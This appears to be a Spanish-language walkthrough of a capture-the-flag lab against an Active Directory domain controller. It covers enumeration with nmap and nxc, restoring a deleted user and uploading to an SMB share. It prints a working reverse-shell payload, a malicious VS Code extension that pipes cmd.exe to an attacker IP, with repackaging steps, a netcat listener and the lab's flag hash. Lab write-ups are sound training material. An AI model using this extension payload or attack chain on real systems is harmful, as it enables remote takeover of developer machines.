# Guía técnica para llegar a `user.txt`

Voy a asumir:

- IP objetivo: `10.129.35.160`
- dominio: `checkpoint.htb`
- usuario inicial: `alex.turner`
- contraseña inicial: `Checkpoint2024!`
- tu IP de atacante: reemplázala por la que corresponda en tu entorno

## 1. Reconocimiento inicial

Primero, validar superficie del host:

```bash
nmap -Pn -n -p- --min-rate 5000 10.129.35.160 -oA nmap-allports
nmap -Pn -n -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 10.129.35.160 -oA nmap-services
```

Lo importante que sale de ahí es que el host es un DC de Active Directory y expone LDAP, SMB, Kerberos y WinRM.

## 2. Validar credenciales iniciales y enumerar el dominio

Con `alex.turner`:

```bash
nxc smb 10.129.35.160 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!'
nxc ldap 10.129.35.160 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users
nxc ldap 10.129.35.160 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --groups
nxc smb 10.129.35.160 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --shares
```

Con esto se confirma que la cuenta funciona y se listan grupos, usuarios y shares útiles.

## 3. Enumerar ACLs para encontrar permisos explotables

Usamos el script local `acl_enum.py`, que ya estaba adaptado para el host del laboratorio.

```bash
CHECKPOINT_HOST=10.129.35.160 \
CHECKPOINT_USER=alex.turner \
CHECKPOINT_PRINCIPAL=ryan.brooks \
CHECKPOINT_PASSWORD='Checkpoint2024!' \
python3 acl_enum.py
```

La salida clave fue que `ryan.brooks` tenía permisos directos sobre `svc_deploy`, especialmente:

- `WriteProperty`
- `Self`

Eso nos permitió modificar atributos del objeto de servicio.

## 4. Recuperar el usuario borrado `mark.davies`

Antes de usar la share, restauramos un usuario eliminado que sí tenía contexto útil en el entorno.

Primero puedes enumerar objetos borrados:

```bash
python3 deleted_enum.py
```

Luego restaurarlo con uno de los dos scripts disponibles. El más directo en este caso fue:

```bash
CHECKPOINT_HOST=10.129.35.160 \
CHECKPOINT_PASSWORD='Checkpoint2024!' \
python3 restore_mark.py
```

Alternativa equivalente:

```bash
CHECKPOINT_HOST=10.129.35.160 \
CHECKPOINT_PASSWORD='Checkpoint2024!' \
python3 restore_mark_impacket.py
```

El usuario restaurado fue:

- `mark.davies`

Y reutilizaba la contraseña:

- `Checkpoint2024!`

## 5. Verificar acceso a la share DevDrop

Una vez restaurado `mark.davies`, verificamos que tenía escritura en la share `DevDrop`.

```bash
nxc smb 10.129.35.160 -d checkpoint.htb -u mark.davies -p 'Checkpoint2024!' --shares
```

Luego entramos a la share con `smbclient`:

```bash
smbclient //10.129.35.160/DevDrop -U 'checkpoint.htb\\mark.davies'
```

Dentro del prompt de `smbclient`:

```text
put checkpoint-tools-1.0.1.vsix
```

La idea es subir una extensión VS Code maliciosa que genere callback hacia tu máquina.

## 6. Preparar la extensión maliciosa

En el repositorio había un VSIX ya preparado. La lógica del payload estaba en:

```text
vsix/extension/extension.js
```

Ese archivo contenía una conexión de retorno tipo:

```javascript
const socket = net.createConnection(4445, '10.10.14.193', () => {
  const shell = childProcess.spawn('cmd.exe', [], {
    windowsHide: true
  });
  socket.pipe(shell.stdin);
  shell.stdout.pipe(socket);
  shell.stderr.pipe(socket);
});
```

Si quieres regenerarlo para una clase, ajusta tu IP y puerto en ese archivo, y luego empaqueta el VSIX. Por ejemplo:

```bash
sed -i "s/10.10.14.193/TU_IP_DE_ATACANTE/g; s/4445/PUERTO_DE_CALLBACK/g" vsix/extension/extension.js
cd vsix
zip -r ../checkpoint-tools-1.0.1.vsix .
```

En el laboratorio, el binario ya estaba preparado como:

- `checkpoint-tools-1.0.1.vsix`

## 7. Levantar listener

Antes de subir el paquete o justo después, levanta el listener en tu máquina:

```bash
nc -lvnp 4445
```

Si cambiaste el puerto en la extensión, usa el mismo número aquí.

## 8. Activar la extensión vía la share

Con el VSIX subido a `DevDrop`, el flujo del laboratorio provocó la ejecución de la extensión en el lado víctima y la conexión de vuelta al listener.

En cuanto conectó, obtuvimos shell como:

- `checkpoint\\ryan.brooks`

## 9. Verificar contexto en la shell de Ryan

Ya con la shell, confirma identidad y grupos:

```cmd
whoami
whoami /groups
hostname
```

En este punto se verificó que Ryan pertenecía a:

- `DevTeam`
- `VPN-Users`

Y que no tenía privilegios administrativos inmediatos.

## 10. Localizar `user.txt`

Con la shell de `ryan.brooks`, se busca el flag en su perfil de usuario. Lo normal es:

```cmd
dir C:\Users\ryan.brooks\Desktop
type C:\Users\ryan.brooks\Desktop\user.txt
```

Si no aparece en `Desktop`, busca con:

```cmd
dir C:\Users\ryan.brooks /s /b | findstr /i user.txt
```

En este caso, el flag de usuario fue:

```text
a0df8576333761986465b8155ce3d591
```

## Resumen corto de la cadena

1. `alex.turner` válido.
2. Enumeración LDAP/SMB.
3. ACLs muestran que `ryan.brooks` puede tocar `svc_deploy`.
4. Se restaura `mark.davies`.
5. `mark.davies` entra a `DevDrop`.
6. Se sube una VSIX maliciosa.
7. Se obtiene shell como `ryan.brooks`.
8. Se lee `user.txt`.
